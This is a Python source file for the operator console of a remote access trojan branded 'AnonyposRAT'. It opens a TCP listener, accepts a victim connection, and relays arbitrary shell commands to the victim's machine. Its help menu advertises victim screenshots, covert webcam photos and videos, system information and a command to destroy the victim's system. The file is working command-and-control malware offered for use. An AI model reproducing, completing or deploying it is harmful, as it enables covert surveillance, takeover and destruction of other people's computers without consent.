import socket
from colorama import Fore
import os
import random
logo_dz = r"""            ╔╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╤╗
            ╟┼┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┼╢
            ╟┤ _   ____    _____              __     ___              _ _    _    _         __      _      ├╢
            ╟┤/ | |___ \  |___ /              \ \   / (_)_   ____ _  | ( )  / \  | | __ _  /_/ _ __(_) ___ ├╢
            ╟┤| |   __) |   |_ \               \ \ / /| \ \ / / _` | | |/  / _ \ | |/ _` |/ _ \ '__| |/ _ \├╢
            ╟┤| |  / __/   ___) |  _ _ _ _ _    \ V / | |\ V / (_| | | |  / ___ \| | (_| |  __/ |  | |  __/├╢
            ╟┤|_| |_____| |____/  (_|_|_|_|_)    \_/  |_| \_/ \__,_| |_| /_/   \_\_|\__, |\___|_|  |_|\___|├╢
            ╟┤                                                                      |___/                  ├╢
            ╟┼┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┬┼╢
            ╚╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╝
                                        The Best RAT! By Anonypos"""
logo_2 = r"""       _                                                                         ________          _   __________
      dM.                                                                        `MMMMMMMb.       dM.  MMMMMMMMMM
     ,MMb                                                                         MM    `Mb      ,MMb  /   MM   \
     d'YM.   ___  __     _____  ___  __  ____    ___ __ ____     _____     ____   MM     MM      d'YM.     MM
    ,P `Mb   `MM 6MMb   6MMMMMb `MM 6MMb `MM(    )M' `M6MMMMb   6MMMMMb   6MMMMb\ MM     MM     ,P `Mb     MM
    d'  YM.   MMM9 `Mb 6M'   `Mb MMM9 `Mb `Mb    d'   MM'  `Mb 6M'   `Mb MM'    ` MM    .M9     d'  YM.    MM
   ,P   `Mb   MM'   MM MM     MM MM'   MM  YM.  ,P    MM    MM MM     MM YM.      MMMMMMM9'    ,P   `Mb    MM
   d'    YM.  MM    MM MM     MM MM    MM   MM  M     MM    MM MM     MM  YMMMMb  MM  \M\      d'    YM.   MM
  ,MMMMMMMMb  MM    MM MM     MM MM    MM   `Mbd'     MM    MM MM     MM      `Mb MM   \M\    ,MMMMMMMMb   MM
  d'      YM. MM    MM YM.   ,M9 MM    MM    YMP      MM.  ,M9 YM.   ,M9 L    ,MM MM    \M\   d'      YM.  MM
_dM_     _dMM_MM_  _MM_ YMMMMM9 _MM_  _MM_    M       MMYMMM9   YMMMMM9  MYMMMM9 _MM_    \M\_dM_     _dMM__MM_
                                             d'       MM
                                         (8),P        MM
                                          YMM        _MM_                                                        """

logo_3 =r"""  ______                                                                         _______    ______   ________
 /      \                                                                       /       \  /      \ /        |
/$$$$$$  | _______    ______   _______   __    __   ______    ______    _______ $$$$$$$  |/$$$$$$  |$$$$$$$$/
$$ |__$$ |/       \  /      \ /       \ /  |  /  | /      \  /      \  /       |$$ |__$$ |$$ |__$$ |   $$ |
$$    $$ |$$$$$$$  |/$$$$$$  |$$$$$$$  |$$ |  $$ |/$$$$$$  |/$$$$$$  |/$$$$$$$/ $$    $$< $$    $$ |   $$ |
$$$$$$$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$      \ $$$$$$$  |$$$$$$$$ |   $$ |
$$ |  $$ |$$ |  $$ |$$ \__$$ |$$ |  $$ |$$ \__$$ |$$ |__$$ |$$ \__$$ | $$$$$$  |$$ |  $$ |$$ |  $$ |   $$ |
$$ |  $$ |$$ |  $$ |$$    $$/ $$ |  $$ |$$    $$ |$$    $$/ $$    $$/ /     $$/ $$ |  $$ |$$ |  $$ |   $$ |
$$/   $$/ $$/   $$/  $$$$$$/  $$/   $$/  $$$$$$$ |$$$$$$$/   $$$$$$/  $$$$$$$/  $$/   $$/ $$/   $$/    $$/
                                        /  \__$$ |$$ |
                                        $$    $$/ $$ |
                                         $$$$$$/  $$/
"""

logos = [logo_dz,logo_2,logo_3]
print(random.choice(logos))
server_port = 7771
server_host = "0.0.0.0"
def settings():
    print(f"""
                    *------------------------------------------------*
                    |                  {Fore.YELLOW}Listener Settings{Fore.RESET}             |
                    +------------------------------------------------+
                    |                                                |
                    | {Fore.RED}Host: {Fore.BLUE}{server_host}{Fore.RESET}{" "*(41-len(server_host))}|
                    | {Fore.GREEN}Port: {Fore.BLUE}{server_port}{Fore.RESET}{" "*(41-len(str(server_port)))}|
                    *------------------------------------------------* """)

def offline_helper():
    print(f"""
                    *---------------------------------------------------*
                    |                   Commands List                   |
                    +---------------------------------------------------+
                    |                                                   |
                    | help: Show this fucking list again.               |
                    | clear: Clear the terminal.                        |
                    | exit: Close the RAT.                              |
                    | set port <port>: Change the port number setting.  |
                    | set host <host name/ip>: Change the host.         |
                    | settings: Show the listener settings.             |
                    | listen: Start the listener.                       |
                    *---------------------------------------------------*""")
def help():
    print(f"""
                    *-------------------------------------------------------*
                    |                     Commands List                     |
                    +-------------------------------------------------------+
                    |                                                       |
                    | help: Show this fucking list again.                   |
                    | clear: Clear the terminal.                            |
                    | exit: Go to the main console.                         |
                    | kill: Kill the connection and stop the client.        |
                    | apps: Get a list of installed apps.                   |
                    | run <app_name>: Start an app by his id.               |
                    | screenshot: Take a screenshot from the victim.        |
                    | sysinfo: Get the device informations.                 |
                    | cam_list: Show all the valide cams of the victim.     |
                    | take_pic <cam_id>: Take a photo from the victim cam.  |
                    | take_vid <cam_id> <sec>: Take a video.                |
                    | fuck_it: Destroy the victim's system.                 |
                    *-------------------------------------------------------*""")
def server():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server_host,server_port))
    print(f"Listening with port {server_port}.....")
    sock.listen(1)
    conn, addr = sock.accept()
    with conn:
        print(f"New connection from {addr[0]}:{addr[1]} !!!")
        while True:
            try:
                cmd = input(f"{Fore.GREEN}Anonypos{Fore.RED}RAT{Fore.RESET}@{addr[0]}~$ ")
                if cmd == "exit":
                    sock.close()
                    offline()
                elif cmd == "clear":
                    os.system("clear")
                elif cmd == "kill":
                    try:
                        conn.send(cmd.encode())
                    except Exception as e:
                        print(f"Error: {e}")
                    sock.close()
                    offline()
                elif cmd == "help":
                    help()
                elif cmd == "apps":
                    print("Comming soon!")
                elif cmd.startswith("run") and cmd[3] == " ":
                    if cmd[4:]:
                        print("Comming soon!")
                    else:
                        print("Please add the app name like 'run Fuckyou'")
                elif cmd.startswith("shell") and cmd[5] == " ":
                    if cmd[6:]:
                        conn.send(cmd.encode());
                        data = ""
                        while True:
                            data += conn.recv(1024).decode()
                            if not data:
                                break;
                        print(data)
                    else:
                        print("Please enter the command");
                elif cmd == "msger":
                    while True:
                        msg = input(">> ")
                        if msg == "exit":
                            break
                        elif msg == "logo":
                            conn.send(logo_2.encode())
                        else:
                            conn.send(msg.encode())
            except KeyboardInterrupt:
                sock.close()
                exit()
def offline():
    while True:
        cmd = input(f"{Fore.GREEN}Anonypos{Fore.RED}RAT{Fore.RESET}>> ")
        if cmd != "":
            if cmd.lower() == "clear":
                os.system("clear")
            elif cmd.startswith("set "):
                if cmd[4:8] == "host":
                    if cmd[9:]:
                        print(f"Host ---> {cmd[9:]}")
                        server_host = cmd[9:]
                    else:
                        print("Please enter the fucking host name or IP!")
                elif cmd[4:8] == "port":
                    if cmd[9:]:
                        try:
                            int(cmd[9:])
                            if len(cmd[9:]) > 4:
                                print("Wowwwww! Are you stupid?")
                            else:
                                server_port = int(cmd[9:])
                                print(f"Port ---> {cmd[9:]}")
                        except:
                            print("Please enter a fucking number not a string!!")
            elif cmd == "settings":
                settings()
            elif cmd == "help":
                offline_helper()
            elif cmd == "listen":
                server()
            elif cmd == "exit":
                print("Ohhh nooooo!!! Please don't stop using the power (≖⩊≖)")
                exit()
            else:
                print(f"'{cmd}' is not a fucking command!! Please type 'help'")

offline()
